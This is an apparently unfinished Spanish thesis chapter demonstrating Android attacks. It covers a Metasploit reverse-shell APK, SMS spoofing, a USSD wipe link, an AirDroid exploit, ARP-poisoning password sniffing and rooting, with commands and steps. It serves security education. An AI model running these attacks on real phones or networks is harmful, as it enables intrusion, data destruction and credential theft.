Capítulo 4

Pruebas en Android

4.1 Objetivo

El objetivo general del capítulo es explorar distintas pruebas prácticas que explotan vulnerabilidades para demostrar que existen riesgos en Android.
Por cada prueba, se explica como se usan las herramientas, demostrando su potencial y factibilidad. Se expone una gama de explotaciones de vulnerabilidades en dispositivos móviles, no sólo aquellas que afectan a Android exclusivamente, sino a otras plataformas.
En líneas generales, las pruebas que se van a realizar son las siguientes:
-Pentesting en Android: aspecto relativo a las pruebas de seguridad que se somete un sistema.
-SMS Spoofing: aspecto relacionado a la red de celulares.
-Vulnerabilidades con USSD: aspecto relativo a la tecnología de las telecomunicaciones.
-Seguridad en apps: aspecto relacionado al software que manipulan los recursos del smartphone.
-Sniffing por WiFi: aspecto relacionado a la red WiFi.
-Desbloqueo en el acceso físico: aspecto relativo al sistema operativo.
-Rooting: aspecto relativo a las acciones voluntarias del usuario con el dispositivo.

4.2 Medidas previas, entorno de trabajo y dispositivos.

Se presentarán distintas pruebas que se realizan con la ayuda de herramientas. Pero antes de ejecutar las pruebas, es aconsejable tomar recaudos para no perder datos en el smartphone a utilizar.
En cuanto a la protección de los datos, se podría realizar una copia de resguardo (backup) de los archivos alojados en la tarjeta SD a otro medio. También se podrían copiar los contactos del celular a la tarjeta SIM, como una forma de respaldar los contactos.
En cuanto al entorno de pruebas, se utiliza el sistema operativo Kali Linux, dado que éste facilita algunas herramientas. Kali Linux es un Sistema Operativo que tiene como objetivo facilitar las auditorías y pruebas inherentes a la seguridad informática en general. Kali Linux tiene preinstalados más de 600 programas incluyendo Nmap (un escáner de puertos), Wireshark (un sniffer), John the Ripper (Un crackeador de passwords) y la suite Aircrack-ng (Software para pruebas de seguridad en redes inalámbricas); es un Sistema que trae herramientas que están documentadas, la mayoría son inherentes al software libre. Se usó este sistema operativo con la idea de facilitar las pruebas y tener a disposición un entorno cómodo para las mismas, dado que no se usó Kali Linux de forma amplia.
Para la ejecución de las pruebas se utilizan 3 dispositivos: Motorola Defy+ (con Android 2.3.5), LG G3 (con Android 5.0.2) y Motorola Moto G (con Android 5.0.2).

4.3 Realización de las pruebas de concepto

4.3.1 Primer prueba

4.3.1.1 Introducción

Primero se parte de la definición de pentesting [PENTEST]:
	"Una prueba de penetración (también llamada pentesting) es la práctica de probar un sistema de computadora, red o aplicación web para encontrar vulnerabilidades que un atacante puede explotar."
Para probar una vulnerabilidad en Android, se usó una herramienta que sirve para realizar "pentesting", la misma se denomina "Metasploit", ésta cuenta con la colaboración de la comunidad del software libre; existen otras herramientas que también permiten realizar pruebas en Android, como por ejemplo "Android Tamer". Hay cuatro versiones de "Metasploit" [METAVER], la versión que se va a utilizar se llama "Metasploit Framework", es la más usada y la más activa entre las cuatro versiones. Esta versión es Open Source y gratuita, es utilizada principalmente por los desarrolladores de exploits y expertos en seguridad; esta versión expone una interfase por línea de comandos y tiene la funcionalidad básica en comparación con la versión paga más cara ("Metasploit Pro") [METAFRA]. Esta herramienta viene incorporada a la distribución de Kali Linux, con lo cual no se describirá cómo se instala, sólo se describirá su uso; con la ejecución de algunos de sus comandos se podrá realizar la prueba.
En esta primer prueba se pretende tener acceso a una herramienta profesional para comprobar la seguridad en Android, la prueba es sencilla y marca el inicio de la serie de demostraciones. A grandes rasgos, la serie de pasos que se sigue es la siguiente: primero se genera el exploit (con una serie de comandos), luego se transmite el exploit al smartphone víctima (con ingeniería social, por ejemplo), una vez que la víctima tiene incorporado el exploit, su autor podrá acceder a cierta información privada contenida en el smartphone, de forma remota.

4.3.1.2 Procedimiento

Los pasos que se van a seguir se los pueden reunir en 2 grupos: la generación del exploit (en una PC) y la activación del exploit (en un smartphone); cada grupo de comandos se va a ejecutar en 2 consolas separadas y en ese orden. El primer grupo de comandos contribuyen en la generación de un archivo que contiene código malicioso (payload). El segundo grupo contribuyen en la ejecución del exploit en el smartphone víctima, que permite la conexión con la víctima cuando éste usa el exploit.
El archivo que se genera, es un instalador de una aplicación Android (lleva la extensión .apk), el cual actúa como un exploit con el objetivo de tener acceso a información privada del sistema víctima. Ésto se logra cuando se activa el exploit, se puede obtener información privada con la ejecución de comandos, como acceder al filesystem o acceder al log de llamadas hechas con el celular. Cuando se ejecuta el exploit desde el smartphone víctima, queda corriendo en segundo plano a la espera de órdenes de un host controlado por el atacante.

CONSOLA 1
// En una consola y en modo superusuario se deben ejecutar los siguientes comandos:
# ifconfig
// Este comando retorna varios parámetros agrupados por interfase de red. En el grupo relativo a la conexión inalámbrica (wlan0), se obtiene la IP de la máquina actual (con el formato X.X.X.X) el cual nos sirve como parámetro para el próximo comando:
# msfvenom -p android/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=8080 R > exploit.apk

CONSOLA 2
// En otra consola y en modo superusuario se deben ejecutar los siguientes comandos:
msfconsole
use multi/handler
set payload android/meterpreter/reverse_tcp
set lhost X.X.X.X
set lport 8080
exploit
// Cuando se instale el exploit en el dispositivo víctima, automáticamente se abrirá un shell de comandos en esta consola, para operar con el dispositivo:
meterpreter >

4.3.1.3 Observaciones

Este comando funcionó para el modelo tal y tal, pero no para tal ---
{ REALIZAR PRUEBAS ADICIONALES }
Cuando se activó el exploit y se ejecutaron comandos desde la PC, de forma remota, algunos de ellos no devolvían los resultados que se esperaban.
En base a esta demostración, se obtuvieron las siguientes conclusiones. Una de ellas, es que se puede generar fácilmente un exploit que obtenga acceso a un smartphone, sin el consentimiento del usuario. Por otro lado, esta técnica se puede mejorar con la ayuda de la ingeniería social, de forma tal que se puede inducir a un usuario (víctima) a instalar el exploit en su celular pensando que es un software benigno. Finalmente, cabe aclarar que esta prueba se aplica específicamente a Android.

4.3.2 Segunda prueba

4.3.2.1 Introducción

En el capítulo 1 (sección 1.5.4.4) se explicó la técnica de SMS Spoofing; en la siguiente prueba se va a demostrar que esta técnica se puede aplicar. Para realizar esta prueba se emplea un servicio ofrecido por una empresa llamada "DiGiMessaging", este servicio permite omitir los detalles de implementación de la técnica, de éso se encarga la empresa. Concretamente, el servicio permite enviar SMSs desde la Web con un caller ID arbitrario. En este caso, se va a utilizar la prueba gratuita, la cual impone una restricción en el envío de SMSs: solo se pueden enviar 3 mensajes SMS por cada cuenta gratuita.

4.3.2.2 Procedimiento

El primer paso es registrarse en el sitio web "http://www.digimessaging.com/", completando formularios con datos personales. Una vez iniciado una sesión con la cuenta recién creada, se debe dirigir al link que dice "FREE TRIAL", donde aparecerá un formulario con forma de celular. Luego se deben completar los campos del formulario de la siguiente manera: en el campo "From" se ingresa un nombre (por ejemplo, "UNLP"), en los campos que corresponden a "To" se selecciona el país Argentina y se ingresa un número de celular sin la característica del país (por ejemplo, "2215775754"); finalmente se apreta el botón "SEND". Pasado un lapso de tiempo (alrededor de 1 minuto), se recibirá un mensaje en el smartphone con el remitente que se definió en el campo "To".

{ imágen del formulario lleno de datos }

4.3.2.3 Observaciones

Con esta prueba se demostró que la aplicación de la técnica del SMS Spoofing es factible y simple, esta técnica puede afectar a cualquier celular, sin importar el sistema operativo que utilice. En este caso, se tercerizó el trabajo a alguna de las tantas empresas que ofrecen este tipo de servicio: el envío de múltiples SMSs a celulares de casi cualquier parte del mundo, con un "caller ID" o "sender ID" arbitrario; por lo tanto, esta prueba no exigió conocimientos técnicos específicos. En el caso de la empresa elegida, se notó durante las pruebas que tiene una restricción de seguridad: no permite enviar SMSs con un remitente de una entidad conocida, como un banco; lo que quiere decir que tiene listas negras para el remitente que se vaya a ingresar.
Esta prueba puede mejorarse, adquiriendo saldo o créditos para poder enviar mas de 3 mensajes. Con otras empresas sucede lo mismo, si se paga un arancel se pueden conseguir mas características.

4.3.3 Tercer prueba

4.3.3.1 Introducción

En esta prueba se toca un aspecto que involucra a las redes celulares digitales; por lo tanto, afecta a cualquier sistema operativo móvil porque se ejecutan comandos para comunicarse con el proveedor de telefonía móvil, que omiten el sistema operativo. Para ejecutar estos comandos, se utilizan los códigos USSD.
La idea del protocolo USSD (Unstructured Supplementary Service Data - Servicio suplementario de datos no estructurados) es de proveer códigos especiales para marcar en un smartphone (o cualquier celular) y comunicarse con un programa dentro de la red de celulares [TECUSSD] para llevar acciones a cabo. Es una tecnología vieja heredada de las antiguas redes de telefonía de segunda generación (2G), la cual empezó a ser popular en la década del 90, pero aún está activa y puede ser usada.
La prueba consiste en usar este protocolo de comunicación para destruir datos, y así demostrar que se lo puede usar con fines maliciosos. Para ello, se usa un comando USSD que reestablece al estado de fábrica a un smartphone (produciendo una pérdida de datos) y/o puede llegar a dejar en un estado obsoleto al chip SIM, esta explotación de la vulnerabilidad puede tener efecto en celulares relativamente viejos como el modelo "S3" de Samsung y en el modelo "Defy+" de Motorola, entre otros. Esta vulnerabilidad fue expuesta públicamente en la conferencia de seguridad llamada "Ekoparty" en el año 2012 [COMPMOV].
Antes de explotar la vulnerabilidad, se puede comprobar si la explotación va a ser exitosa con una pequeña prueba. Previo a la explotación se describirá esta pequeña prueba previa. Antes de describir la prueba que explota la vulnerabilidad, se va a comentar un método que sirve para comprobar si se puede dañar al smartphone que se va a someter. Este método es sencillo,
Sin embargo, la vulnerabilidad ya fue controlada, porque los sistemas operativos actuales ya no cuentan con este tipo de riesgos, evitan la ejecución de este tipo de comandos peligrosos. Para los smartphones que aún posean la vulnerabilidad, se puede instalar una app de un tercero.

[TECUSSD] [http://searchnetworking.techtarget.com/definition/USSD]
[COMPMOV] [http://computacionmovil-ar.blogspot.com.ar/2012/09/explicacion-de-la-vulnerabilidad-de.html]

4.3.3.2 Procedimiento

La prueba para saber si un smartphone es susceptible a esta vulnerabilidad consta de hacer click en un link y verificar si devuelve el número de IMEI (es un número único para identificar celulares); si es así, entonces el equipo no tiene una barrera de seguridad para filtrar estos códigos y es susceptible a los ataques que usan este medio.
(se puede mostrar una página estática con un link <a> que apunte a "tel:*#06#").
Código html:
<a href="tel:*%2306%23" target="_blank">IMEI</a>

Ahora, para notar los efectos de esta explotación se puede usar el siguiente vector de ataque: un link recortado, el cual oculta su contenido original y quizás aparenta ser inofensivo con ayuda de la ingeniería social.
(La prueba consiste en el acceso a un link que apunte a la siguiente dirección "tel:*2767*3855#".)
Código html:
<a href="tel:*%2306%23" target="_blank">IMEI</a>

4.3.3.3 Observaciones

Esta prueba expone una vulnerabilidad que es explotada fácilmente, pero afecta a algunos equipos relativamente viejos. Sin embargo, ésto nos demuestra que existen vectores de ataque como los códigos QR, links recortados (que suelen emplearse en twitter), links enviados por sms, etc. En el futuro se podrían descubrir métodos de explotación que utilicen los mismos vectores de ataque, aunque se podrían prevenir sus efectos con la incorporación de cierta educación en el usuario para que preste atención y analice este tipo de contenido.
[SE PUEDE PROFUNDIZAR ... HABLANDO TODO ACERCA DEL TAG "TEL"]

"En Android, los códigos USSD se ejecutan directamente sin preguntarle nada al usuario."
"El tag 'TEL:' posibilita que desde un link se puedan marcar números telefónicos."
"Esta capacidad de interpretar este tag no es exclusiva de los dispositivos con Android, si no de todas las plataformas, e inclusive de teléfonos de gama baja, solo es necesario que tenga un navegador móvil."
"Aparentemente solo afecta a celulares de la marca Samsung"

[Cómo se usa la URI] [http://www.rfc-editor.org/rfc/rfc3966.txt]
[Nota de la BBC acerca de este Bug] [http://www.bbc.com/news/technology-19784413]
[Una nota acerca de este bug] [http://gizmodo.com/5946334/samsung-security-bug-can-wipe-out-your-galaxy-phone-updating]
[Android Central] [http://www.elandroidelibre.com/2012/09/todo-sobre-el-ultimo-problema-de-seguridad-de-android-en-que-consiste-y-como-saber-si-estas-afectado.html]

4.3.4 Cuarta prueba [ COMPLETAR!!! ]

4.3.4.1 Introducción

En las distintas apps que se pueden adquirir desde los diversos medios de distribución (ya sean apps legítimas o no) pueden contener bugs de seguridad, los cuales pueden ser explotados para obtener privilegios en el acceso al sistema operativo, hacer daño, etc. Esta prueba consiste en demostrar otro aspecto a tener en cuenta los sistemas operativos móviles: la seguridad en las apps.
Para realizar esta prueba se utiliza una app legítima llamada "AirDroid", la cual es una app bastante popular. AirDroid sirve para controlar y administrar uno o varios dispositivos móviles con Android desde una PC, desde ésta se puede enviar mensajes SMS, transferir archivos, usar el GPS, usar la cámara de fotos, acceder a los contactos, etc. [AIRDROI]. Para conectarse utiliza una conexión Wi-Fi.
En esta prueba se explota una vulnerabilidad específica de "AirDroid" con la ayuda de un "exploit". En este caso, se usa un "script" escrito en "Python" que fue obtenido de un registro público de "exploits" llamado "Exploit Database" [EXPLODB]. Esta vulnerabilidad ya fue resuelta, o sea que ya se publicó una actualización que corrige este bug; entonces, para que funcione esta demostración, se necesita adquirir e instalar una versión anterior a la versión que contiene la corrección. Para ello, se acude a un repositorio alternativo llamado "Apk 4 Fun" [APKFFUN] que tiene un historial de versiones de muchas apps, junto con los paquetes instaladores. En definitiva, este repositorio aloja varios versiones viejas de "AirDroid", en este caso se va a usar la versión 3.1.3, dado que a partir de la versión 3.1.4 ya se corrigió este bug [AIRFORU]. Cabe aclarar que el marketplace oficial Google Play está descartado para obtener la app, porque tiene la versión más reciente.
Este exploit permite que las PCs que se encuentran conectadas en la misma red puedan transferir archivos a un dispositivo cualquiera que esté usando AirDroid, sin que éste lo perciba. En el marco de esta prueba, se tienen los siguientes elementos: una red local en la cual está conectado un smartphone y 2 PCs. En el entorno concreto de esta prueba se usa: una notebook con "Windows 7" que usa AirDroid desde la web, un smartphone "LG G3" con Android 5.0.2 ("Lollipop") que lleva instalada la app AirDroid, y la máquina atacante es una notebook con Kali Linux que lleva la versión 2.7 de Python. La interacción entre ellos sucede de esta forma: el smartphone y la PC comparten datos por medio de la app "AirDroid", normalmente; desde otra PC en la misma red local, se pueden subir archivos al smartphone de forma inadvertida y sin estar autenticado en el ámbito de "AirDroid", gracias a la ayuda del "exploit".

[AIRFORU] [http://forums.airdroid.com/viewtopic.php?f=6&t=15870]
[EXPLODB] [https://www.exploit-db.com/exploits/37504/]
[APKFFUN] [http://www.apk4fun.com/apk/56479/]
[AIRDROI] [https://www.airdroid.com/]

4.3.4.2 Procedimiento

Primero, en una PC se debe crear una cuenta de AirDroid e iniciar sesión con esa misma cuenta desde el sitio web de AirDroid (https://www.airdroid.com/) y en el smartphone se debe descargar e instalar la versión 3.1.3 de la app AirDroid a partir del repositorio llamado "Apk 4 Fun".
Luego, desde la PC que tiene Linux, se debe ejecutar el script que explota la vulnerabilidad. Los parámetros más importantes de este script son: IP y puerto del smartphone víctima, nombre del archivo a enviar y ubicación del archivo dentro del filesystem de la víctima. Por ejemplo:
$ python exploit.py 192.168.0.43 8888 prueba.txt prueba.txt /sdcard
En donde, el primer parámetro es el nombre del archivo que se comporta como exploit, el segundo y tercer parámetro es la dirección IP y el puerto de la víctima, respectivamente, el cuarto parámetro es el nombre que se le va a asignar al archivo transferido, el quinto parámetro define el nombre del archivo local que se va a transferir, el sexto parámetro es la ubicación en el smartphone (donde se va a depositar al archivo).

4.3.4.3 Observaciones

{ FALTAN PRUEBAS CON OTROS DISPOSITIVOS }
En esta prueba se consiguió infiltrar archivos en un smartphone por medio de la app "AirDroid", sin el consentimiento del usuario y sin que lo perciba. No se analizó la implementación del exploit, sino los resultados de su aplicación. En este caso, esta prueba solo afecta a los dispositivos con Android; sin embargo, queda claro que las apps pueden contener bugs de seguridad que pueden ser aprovechados por exploits, acá se demostró que ésto también sucede en el entorno móvil.

4.3.5 Quinta prueba [ COMPLETAR!!! ]

4.3.5.1 Introducción

Los smartphones actuales pueden conectarse a una red Wi-Fi, sin embargo la incorporación de esta tecnología permite capturar información del smartphone empleando técnicas conocidas y probadas en las PCs, como sniffing. Esta prueba se puede aplicar en otros entornos móviles, no sólo en Android. Acá se demuestra que se puede monitorear el tráfico que entra y sale de un smartphone que está conectado a una red WiFi, sin el consentimiento del usuario. Para ello se utilizan 2 herramientas: "Ettercap" y "Wireshark", las cuales corresponden a las 2 etapas de esta prueba.

Ettercap sirve para realizar ataques "man-in-the-middle", contiene una serie de herramientas que ayudan a realizar este ataque. También sirve para efectuar análisis de redes y hosts, entre otras funciones [ETTERCA]. En esta prueba se lo usa para realizar la primer etapa, configurar una PC atacante para que pueda interceptar los paquetes que se transmitan entre un router y un smartphone. Para ello, se realiza un ataque ARP spoofing con la herramienta Ettercap. { EXPLICAR ARP SPOOFING }
[ETTERCA] [https://ettercap.github.io/ettercap/]

Wireshark sirve para analizar paquetes y es la herramienta más popular que realiza este tipo de estudios. Permite ver lo que sucede en la red con un alto nivel de detalle [WIRESHA]. Permite una inspección profunda de cientos de protocolos. Realiza una captura en vivo, para su posterior análisis de forma offline.
En esta prueba se lo usa para realizar la segunda etapa, estudiar los paquetes que intercepta el host atacante. El objetivo es exhibir que se pueden capturar paquetes con intensiones maliciosas, como por ejemplo, el robo de una contraseña de una cuenta de usuario. Este último ejemplo se va a probar al final.
[WIRESHA] [https://www.wireshark.org/about.html]

4.3.5.2 Procedimiento

[PRIMER ETAPA]
En la primer etapa, en que se utiliza la herramienta "Ettercap", se deben realizar los siguientes pasos.

Se debe abrir la aplicación, ésto se puede realizar desde una consola ejecutando como superusuario o "root":
# ettercap -G
Una vez dentro de la aplicación, dentro de la interfase gráfica, se debe preparar el ataque. Para ello se debe desplegar el menú "Sniff" para seleccionar el ítem "Unified sniffing". Aparece una ventana en que se debe elegir la interfase inalámbrica, en el caso de esta prueba, se llama "wlan0" y presionar el botón de aceptar.
Después, para explorar la red en busca del host que queremos espiar, se busca dentro del menú "Hosts" el ítem "Scan for hosts". Con este comando se explora en la red a la cual está conectada la interfase que se eligió en el punto anterior, en busca de hosts.
A continuación, se puede ver la lista de los nodos de la red, desplegando el menú "Hosts" y eligiendo el ítem "Hosts list". En este listado, se debe continuar configurando el ataque definiendo la intrusión entre 2 hosts (el router y el smartphone). Entonces, por un lado se debe seleccionar la IP del smartphone del listado y presionar el botón "Add to target 1", y por el otro lado, se debe seleccionar la IP del router y presionar el botón "Add to target 2".

{ EXPLICAR COMO SE PUEDEN IDENTIFICAR LAS IPs DE LOS HOSTS }
Cabe aclarar que ... para saber las IPs ... ( nos puede servir el comando "route -n" para conocer la IP del router )
Para cerrar la configuración del ataque, se debe elegir dentro del menú "Mitm", el ítem "Arp Poisoning". Con ésto aparece una ventana en la que se debe tildar el casillero que dice "Sniff remote conections".
Finalmente, para efectuar el ataque, en el menú se elige "Start Sniffing".

[SEGUNDA ETAPA]
En la segunda etapa se usa "Wireshark" y se deben realizar los siguientes pasos.

Desde la PC, se debe abrir la aplicación, para ello se puede ejecutar desde una consola como superusuario o "root":
# wireshark
Probablemente se muestre una o dos advertencias indicando que el usuario que abrió la aplicación es "root", estos avisos deben ser ignorados.
Una vez dentro de la aplicación, dentro de la interfase gráfica, se debe ejecutar la captura de paquetes. Para ello se debe desplegar el menú "Capture" para selecionar el ítem "Interfaces...". Aparece una ventana en la que una lista con interfases de red; se debe seleccionar la que se conecta a la red local. En el caso concreto de esta prueba se debe seleccionar la interfase, que se conecta a un red via Wi-Fi, denominada "wlan0"; acto seguido se debe presionar el botón "Start". Con ésto se inicia la captura de paquetes que entran y salen de la interfase de red seleccionada.

Mientras se capturan paquetes con la PC, desde el smartphone se debe ingresar a un sitio web que demande un inicio de sesión para acceder a cierto contenido privado. Para esta prueba específica [SAMCLAS], se utiliza el sitio web: "gogo6.com", en éste se debe dirigir al inicio de sesión accediendo al enlace "sign in" en la parte superior a la derecha. Luego, se debe completar los datos del formulario: nombre de usuario y contraseña, acto seguido apretar el botón "sign in".

Cuando se termina de trabajar con el smartphone, se debe retornar a la PC para detener la captura de paquetes. Con la captura realizada, se deben filtrar los paquetes así: en el campo "Filter:" escribir "frame contains gmail.com". El filtro aplicado sirve para seleccionar los paquetes que interesan, y a partir de un paquete, se debe extraer la información que interesa. El filtro se basa en la idea de que la dirección de e-mail ingresada como identificador de usuario pertenece a GMail.
Seleccionar uno de los paquetes que aparecen como resultado del filtrado, hacer click secundario en él para que aparezca un menú emergente, elegir la opción que dice "Follow TCP Stream". Se muestra una nueva ventana con un texto en el centro, se debe usar la herramienta de búsqueda para localizar el texto "gmail.com", se verá que al lado de este texto se puede encontrar la contraseña ingresada, en este caso hay un texto "password" que señala cuál es la contraseña ingresada.

[SAMCLAS] [https://samsclass.info/120/proj/p3-wireshark.htm] (usando Wireshark).
[SNIFFTU] [http://hacking-pentesting.blogspot.com.ar/2013/09/sniffer-espiando-nuestra-red-local.html] (usando Ettercap).

Fuente:
Otros vectores de ataque:
https://en.wikipedia.org/wiki/DNS_hijacking
https://en.wikipedia.org/wiki/ARP_spoofing

4.3.5.3 Observaciones

En este caso, se puede realizar un ataque del tipo "man-in-the-middle" porque los datos de la cuenta (usuario y contraseña) no estan encriptados. En el caso de que el sitio web utilice una tecnología de seguridad para encriptar los datos que se transmitan entre el navegador y el servidor (como lo hace "GMail", por ejemplo), no se podría ubicar la información que interesa para este caso.
La primer etapa se realiza mécanicamente, o sea que casi siempre se van a efectuar los mismos pasos; en cambio, la segunda etapa puede requerir un poco de análisis para tomar de decisiones. Por ejemplo, el criterio del filtro puede cambiarse por uno más preciso quizás, para ello se podría inspeccionar el código HTML de la página web, y allí averiguar el nombre de los campos del usuario y contraseña que se envían al servidor.

4.3.6 Sexta prueba [ COMPLETAR!!! ]

4.3.6.1 Introducción

El tamaño y peso del smartphone lo hacen portable para que el usuario pueda llevarlo consigo a cualquier lugar, para poder aprovechar sus funciones en cualquier momento. Sin embargo, esta característica lo expone a riesgos, dado que el smartphone puede estar al alcance de una persona que no sea el dueño y que tiene malas intenciones. En esta prueba se va a demostrar que existen formas para tener acceso a la información contenida en el smartphone, eludiendo medidas de seguridad, como el bloqueo de la pantalla. Se realizarán 2 pruebas: la primera consiste en forzar al smartphone a volver al estado de fábrica ("hard reset") con la finalidad de poder volver a usar el smartphone (sin la pantalla bloqueada) y poder ver lo que contiene la tarjeta SD; la segunda prueba consiste en aprovechar las facilidades que brinda Android para el desarrollo de apps, pero con intenciones maliciosas. Esta última se apoya en que cuando un smartphone se conecta a la PC y el mismo está en "modo desarrollo", se puede tener acceso al filesystem del smartphone por la línea de comandos.
Previo a la realización de las pruebas, es recomendable tomar precauciones. Se podría extraer la tarjetas SIM y la tarjeta de memoria SD, dado que no hay certeza de que esta operación deje a la tarjeta SIM en el mismo estado que estaba antes de la prueba.

4.3.6.2 Procedimiento

- Apagar el smartphone.
- Presionar botón para bajar el volúmen y el botón de encendido a la vez.
- Presionar botón para subir y bajar el volúmen a la vez.
- Se muestra un menú, en el cual se debe elegir "Wipe data/factory reset".

[DEV]
Otra posibilidad es ingresar al sistema mediante shell si el equipo tiene habilitado el modo desarrollo.
http://null-byte.wonderhowto.com/how-to/locked-out-your-phone-heres-you-bypass-android-pattern-lock-screen-0138807/

4.3.6.3 Observaciones

Los pasos descritos dependen del modelo del smartphone utilizado. Para volver al estado de fábrica a otro modelo de smartphone se debe consultar el sitio web llamado "Hard reset" (http://www.hard-reset.com).

4.3.7 Séptima prueba [ COMPLETAR!!! ]

4.3.7.1 Introducción

El proceso de "rooting" de dispositivos con Android le permite al usuario tener control privilegiado (permisos de superusuario) sobre el sistema operativo; sin embargo, estos usuarios deben manajerse con cuidado porque pueden causar daños al equipo de forma involutaria, se explicó este tema en el capítulo 1 (sección 1.5.4.2). Las aplicaciones que posibilitan el "rooteo" no dan ninguna garantía de que no van a dañar al smartphone que se va a someter, o sea que el hecho de aplicar este proceso ya es un riesgo en sí mismo, a parte de las consecuencias que acarrea. Esta prueba consiste en la realización de este proceso, para ello se obtuvo información del procedimiento que se debe realizar, a partir de foros, blogs, páginas web personales, etc.
En cuanto a la preparación del ambiente para esta prueba, se utilizó una PC con Windows 7 porque el exploit funciona en Windows.
{ EXPLICAR QUE TAMBIÉN SE USÓ LINUX :) }
El proceso de ejecución del exploit se lo puede dividir en 2 etapas: instalación de drivers y rooteo. Primero se deben instalar los drivers que provee el fabricante del smartphone para que el sistema operativo lo detecte y así poder ejecutar comandos en el mismo; esencialmente, la herramienta de línea de comandos llamada "adb" es la que ayuda a realizar el "rooting", con lo cual se debe probar que funcione "adb" antes de ejecutar el exploit. Finalmente, se debe ejecutar el exploit.
Para este caso, se utilizó un smartphone modelo "Defy Plus", de la marca "Motorola".

http://www.taringa.net/comunidades/motoroladefy/7710427/Consulta-Rootear-motorola-defy-plus.html [Fundamental!!!]
http://www.taringa.net/comunidades/motoroladefy/5277669/Pedido-Root-defy-plus-2-3-5.html [Accesorio]
° Se bajan los drivers desde acá (son para Windows):
https://motorola-global-portal.custhelp.com/app/answers/detail/a_id/88481
° Se descarga el exploit que permite el rooting del smartphone desde acá:
http://www.mediafire.com/?5d82batkh7hwm6z
° Se instala la aplicación de escritorio "Motorola Device Manager", el cual instala los drivers para que Windows reconozca el smartphone conectado. Es un típica instalación de Windows (no requiere configuración).
° Se enchufa el smartphone al puerto USB y se activa la Depuración USB (Menu / Aplicaciones / Desarrollo).
° Se descomprime el paquete que contiene el exploit en una carpeta y desde la línea de comandos se debe dirigir a esa ubicación. Luego, ejecutar "adb.exe devices" para asegurarse que el smartphone ha sido detectado, si aparece en el listado se prosigue.
° Se ejecuta el exploit, el mismo no tiene complicaciones: se presiona la tecla "enter" por cada mensaje que aparece hasta que indica que se terminó el proceso.

4.3.7.2 Procedimiento

- Se descarga la aplicación que trae los drivers del smartphone desde el sitio web del fábricante [MOTODRI]. Luego se descarga el exploit [ROOTEXP].
- Se instala la aplicación de escritorio "Motorola Device Manager", el cual instala los drivers para que Windows reconozca al smartphone cuando se lo conecta. Esta instalación no requiere configuración.
- Se descomprime el archivo que contiene el exploit en un carpeta temporal. Desde allí, se accede a la carpeta "Root+Boot-AIO" por la línea de comandos para ejecutar el comando "adb devices". Ésto es para probar si el sistema operativo detectó al smartphone. Si la prueba fue exitosa, se continúa con el siguiente paso.
- Se ejecuta el exploit, el mismo no tiene complicaciones: se ejecuta el archivo "runme.bat" desde la línea de comandos que se abrió en el paso anterior. Por cada mensaje que aparece, se presiona la tecla "enter" hasta que indica que se terminó el proceso.

[MOTODRI] [https://motorola-global-portal.custhelp.com/app/answers/detail/a_id/88481]
[ROOTEXP] [http://www.mediafire.com/?5d82batkh7hwm6z]

Fuentes:
http://www.xda-developers.com/root/
http://whiteboard.ping.se/Android/Rooting

4.3.7.3 Observaciones

La forma en que se realizó el rooteo es muy sencillo. No obstante, se corren riesgos dado que la fuente de donde se consiguió el exploit no es confiable. Se podría haber ejecutado el exploit en un entorno Linux.

4.3.8 Octava prueba [COMPLETAR!!!]

Malware

En la intro comentar acerca de las últimas amenazas: Stagefright y el del video MKV.
http://blog.trendmicro.com/trendlabs-security-intelligence/trend-micro-discovers-vulnerability-that-renders-android-devices-silent/

https://blog.zimperium.com/stagefright-vulnerability-details-stagefright-detector-tool-released/
https://blog.zimperium.com/experts-found-a-unicorn-in-the-heart-of-android/
https://blog.zimperium.com/how-to-protect-from-stagefright-vulnerability/

http://www.darkreading.com/mobile-security.asp
http://www.darkreading.com/vulnerabilities-and-threats/the-month-of-android-vulnerabilities-rolls-on/d/d-id/1321849?

Facilidad de desarrollo de un malware con el uso de algunas herramientas.
-> Análisis estático y dinámico.

Ver las vulnerabilidades en..
http://www.cvedetails.com/

4.3.9 Novena prueba

Ataques por Bluetooth
Ataques por WiFi con Aircrack (ver el archivo aircrack.txt)

4.3.10 Decima prueba

Riegos de usar la nube como medio de almacenamiento, como Google Cloud Storage.

4.3.11 Onceaba prueba

Sniffing por GPRS, estación de base falsa.

4.3.12 Doceaba prueba

WhatsSpy-Public

Fuente:
https://gitlab.maikel.pro/maikeldus/WhatsSpy-Public/wikis/home

IDEAS SUELTAS
--------------

- Hablar de la falta protección de la SD Card (pag. 21 del libro de Jeff Six).

4.3 Amenazas generales en los dispositivos

Acceso wireless

- Sniffing

Extravío o robo

- Según un estudio Usar passcodes poco elaboradas 

Phishing

Privacidad

Malware

Uso de la Nube como medio de almacenamiento

- Google Cloud Storage
- ICloud (IPhone)

4.5 Causas

Cuando se dan a conocer bugs, Google responde con fixes que se propagan a cada uno de los vendors, carriers y OEMs (en fin, proveedores), pero lleva un tiempo hasta que estas actualizaciones lleguen al usuario final o a los nuevos usuarios.

:::::: Se puede agregar ::::::

[ http://www.sersc.org/journals/IJSIA/vol9_no4_2015/29.pdf ] [ Android's External Device Attack: Demonstration and Security Suggestions ]
[ http://www.ijcaonline.org/research/volume128/number12/lone-2015-ijca-906683.pdf ] [ Implementation of Forensic Analysis Procedures for WhatsApp and Viber Android Applications ]
